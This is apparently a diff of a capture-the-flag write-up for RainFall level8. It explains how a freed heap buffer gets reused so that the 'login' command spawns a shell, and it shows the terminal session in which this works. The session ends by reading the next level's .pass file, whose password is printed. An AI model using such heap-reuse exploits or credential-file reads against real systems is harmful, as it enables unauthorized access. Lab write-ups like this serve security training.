@@ -1,85 +1,26 @@
+in this level, we have to enter several commands and each command do different things
+auth xxx : allocate a string in the auth global variable and copy the part after 'auth ' the its length is smaller than 30
+reset: deallocate the string hold by auth global variable
+servicexxxx: strore a copy of the part after 'service'
+login: open the shell if auth[32] is set, ask for password otherwise
+
+even if we have strcpy, we cannot averride the content of auth+32 because the program check the length
+but we notice that if you do 'reset' and then 'auth ' then we get the same address from malloc
+and each time we call 'auth ' or 'service' we get an address that is 16 bytes after the previous one
+so all what we have to do is call 'auth ' the 'service' twice, 'reset' and call 'auth ' again
+the auth+32 byte will point to the service string, and call 'login' to open the shell
+
 level8@RainFall:~$ ./level8
 (nil), (nil)
+auth
+0x804a008, (nil)
 service
-(nil), 0x804a008
-auth service
-0x804a018, 0x804a008
-reset
-0x804a018, 0x804a008
+0x804a008, 0x804a018
 service
-0x804a018, 0x804a018
-auth service
-0x804a028, 0x804a018
+0x804a008, 0x804a028
 reset
-0x804a028, 0x804a018
-service
-0x804a028, 0x804a028
-auth service
-0x804a038, 0x804a028
-reset
-0x804a038, 0x804a028
-auth service
-0x804a038, 0x804a028
-reset
-0x804a038, 0x804a028
-service
-0x804a038, 0x804a038
-auth service
-0x804a048, 0x804a038
-reset
-0x804a048, 0x804a038
-servuce
-0x804a048, 0x804a038
-service
-0x804a048, 0x804a048
-logi
-0x804a048, 0x804a048
+0x804a008, 0x804a028
 login
-Password:
-0x804a048, 0x804a048
-auth service
-0x804a058, 0x804a048
-auth service
-0x804a068, 0x804a048
-service
-0x804a068, 0x804a078
-service
-0x804a068, 0x804a088
-reset
-0x804a068, 0x804a088
-service
-0x804a068, 0x804a068
-auth service
-0x804a098, 0x804a068
-reset
-0x804a098, 0x804a068
-service
-0x804a098, 0x804a098
-auth service
-0x804a0a8, 0x804a098
-reset
-0x804a0a8, 0x804a098
-auth service
-0x804a0a8, 0x804a098
-reset
-0x804a0a8, 0x804a098
-auth service
-0x804a0a8, 0x804a098
-service
-0x804a0a8, 0x804a0b8
-service
-0x804a0a8, 0x804a0c8
-reset
-0x804a0a8, 0x804a0c8
-auth service
-0x804a0a8, 0x804a0c8
-login
-$ cd ../level8
-/bin/sh: 1: cd: can't cd to ../level8
-$ ls
-ls: cannot open directory .: Permission denied
-$ pwd
-/home/user/level8
 $ cd ../level9
 $ cat .pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
